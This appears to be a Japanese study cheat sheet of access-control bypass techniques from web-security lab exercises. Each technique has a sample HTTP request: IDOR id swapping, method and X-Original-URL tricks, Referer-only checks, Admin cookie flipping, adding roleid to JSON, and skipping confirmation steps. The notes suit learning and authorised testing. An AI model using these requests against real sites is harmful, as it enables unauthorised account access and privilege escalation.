# Access Control

## Request

### Method

#### メソッド名を変える
認可チェックがメソッド名の完全一致(例: `=== "POST"`)で判定している場合、GETや存在しないメソッド名に変えるとチェック自体をすり抜けられることがある
```
POST /admin/promote?username=wiener → Unauthorized
POSTX /admin/promote?username=wiener → missing parameter(チェックは突破できた証拠)
GET /admin/promote?username=wiener → 成功
```

### URL

#### robots.txt
管理画面など隠しURLのヒントが載っていることがある
```
GET /robots.txt HTTP/1.1
```

#### id の書き換え(IDOR)
idを他ユーザーの値に書き換えると認可チェック漏れで見えることがある
```
GET /my-account?id=wiener HTTP/1.1
→ GET /my-account?id=carlos HTTP/1.1
```

#### 推測不能な id の入手
狙っている他ユーザーのid(guid等)が推測できなくても、別ページにそのユーザーのidが漏れていることがある。例えばブログ記事の投稿者名リンクに、そのユーザーのguidが埋まっている
```
GET /blog/post?postId=1 のページ内:
<a href="/blog/author?userId=ab12cd34-...">carlos</a>
→ carlosのguid(ab12cd34-...)が判明。これをidパラメータに使う
```

#### パスの連番書き換え
URLパス中の連番(ファイル番号等)を書き換えると他人のファイルが見えることがある
```
GET /download-transcript/2.txt
→ GET /download-transcript/1.txt
```

### Header

#### X-Original-URL
X-Original-URLでパスの偽装ができる。パスはヘッダーに、パラメータは本来のリクエストラインに書く
```
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

#### Referer
Refererヘッダの値だけで「管理画面経由か」を判定している場合、本人確認(Cookie/セッション)が伴っていないことがある。Refererは正規のものを使い回し、Cookieだけ低権限ユーザーのものに差し替える
```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://target/admin
Cookie: session=wiener(低権限ユーザー)
```

### Cookie

#### 権限フラグの書き換え
権限フラグをtrueに書き換える
```
Cookie: Admin=false
→ Cookie: Admin=true
```

### Body(JSON)

#### 未送信パラメータの追加
レスポンスにしか出ていない未送信パラメータを追加すると通ることがある
```
{"email":"x"}
→ {"email":"x","roleid":2}
```

## Response

#### view-source
HTMLコメントや隠しリンクに管理画面のURLが書かれていることがある
```
view-source:対象ページのURL
```

#### 302リダイレクト
本来200で返すはずのHTMLがそのままbodyに乗っていることがある(ブラウザは無視して遷移するが、Burpの生レスポンスなら見える)
```
HTTP/1.1 302 Found
(本来200で返すHTMLがbodyに残っている)
```

#### フォームのvalue属性
編集フォームのinputに、現在の値(パスワード等)が平文でそのまま入っていることがある
```
<input type="password" name="password" value="実際のパスワード">
```

## Flow

#### 複数ステップのスキップ
申請→確定のような複数ステップ処理では、最初のステップだけ認可チェックがあり、後続の確定ステップは単体で呼べてしまうことがある
```
1回目(申請): POST action=upgrade&username=wiener → Unauthorized
2回目(確定)だけを直接送信: POST action=upgrade&confirmed=true&username=wiener → 成功
```
